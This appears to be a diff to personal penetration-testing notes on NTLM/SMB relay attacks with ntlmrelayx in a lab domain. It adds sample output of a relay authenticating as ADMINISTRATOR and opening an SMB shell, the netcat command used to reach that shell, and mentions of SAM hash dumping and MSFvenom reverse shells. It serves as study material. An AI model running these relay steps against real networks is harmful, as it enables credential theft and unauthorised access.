@@ -327,12 +327,30 @@ ntmlrelayx.py -tf targets.txt -smb2support -i
 Note: targets.txt contains the IP addresses of who we want to attack. without this it won't respond to your attempts. 
 
 ```
--i interact
+-i interact (gives you the option to open an SMB shell if ntlmrelayx is able to connect)
 -e example.exe: execute example.exe
 -c ls: run command ls
 ```
 looking for it to dump SAM hashes or give you and SMB client shell for the known user. can use MSFvenom to create an executable payload and get reverse shell. or create a powershell script or CMD to run as a command to get a reverse shell or do something. 
 
+### Interactive Shell:
+```
+[*] Servers started, waiting for connections
+[*] SMBD-Thread-4: Connection from MARVEL/ADMINISTRATOR@192.168.1.40 controlled, attacking target smb://192.168.1.40
+[-] Signing is required, attack won't work unless using -remove-target / --remove-mic
+[-] Authenticating against smb://192.168.1.40 as MARVEL/ADMINISTRATOR FAILED
+[*] SMBD-Thread-5: Connection from MARVEL/ADMINISTRATOR@192.168.1.40 controlled, attacking target smb://192.168.1.43
+[*] Authenticating against smb://192.168.1.43 as MARVEL/ADMINISTRATOR SUCCEED
+[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
+```
+### Connect to the SMB shell: 
+```
+nc 127.0.0.1 11000
+```
+hint: use 'help' for a list of SMB shell commands
+
+
+### Hashes:
 ```
 [*] Authenticating against smb://192.168.1.43 as MARVEL/FCASTLE SUCCEED
 [*] SMBD-Thread-19: Connection from MARVEL/FCASTLE@192.168.1.42 controlled, attacking target smb://192.168.1.42
